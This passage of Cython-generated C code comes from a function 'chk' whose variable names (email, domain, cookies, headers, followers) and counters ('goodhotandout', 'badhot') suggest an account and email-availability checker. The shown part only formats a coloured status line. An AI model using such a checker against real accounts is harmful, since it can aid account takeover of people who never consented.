  __Pyx_AddTraceback("source.Sajad.chk", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_5Sajad_6chk(__pyx_self, __pyx_v_self, __pyx_v_use);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad_6chk(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_use) {
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_v_dom = NULL;
  PyObject *__pyx_v_domin = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_heedrs = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_req = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_rr = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_bio = NULL;
  PyObject *__pyx_v_fol = NULL;
  PyObject *__pyx_v_fols = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_haha = NULL;
  PyObject *__pyx_v_ada = NULL;
  PyObject *__pyx_v_s = NULL;
  PyObject *__pyx_v_rest = NULL;
  PyObject *__pyx_v_re = NULL;
  PyObject *__pyx_v_datet = NULL;
  PyObject *__pyx_v_print = NULL;
  PyObject *__pyx_v_Panel = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_Console = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_Text = NULL;
  PyObject *__pyx_v_infoprint = NULL;
  PyObject *__pyx_v_infosand = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  int __pyx_t_14;
  char const *__pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  int __pyx_t_22;
  int __pyx_t_23;
  Py_ssize_t __pyx_t_24;
  PyObject *__pyx_t_25 = NULL;
  PyObject *__pyx_t_26 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("chk", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sg); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = PyTuple_New(48); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = 0;
      __pyx_t_7 = 127;
      __Pyx_INCREF(__pyx_kp_u__3);
      __pyx_t_6 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__3);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__3);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_grn); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_goodhotandout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__4);
      __pyx_t_6 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__4);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__4);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okhot); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_kp_u__5);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 9, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 10, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 11, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__6);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__6);
      PyTuple_SET_ITEM(__pyx_t_5, 12, __pyx_kp_u__6);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_yalo); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 13, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badmain); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 14, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 15, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__4);
      __pyx_t_6 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__4);
      PyTuple_SET_ITEM(__pyx_t_5, 16, __pyx_kp_u__4);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 17, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badhot); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 18, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
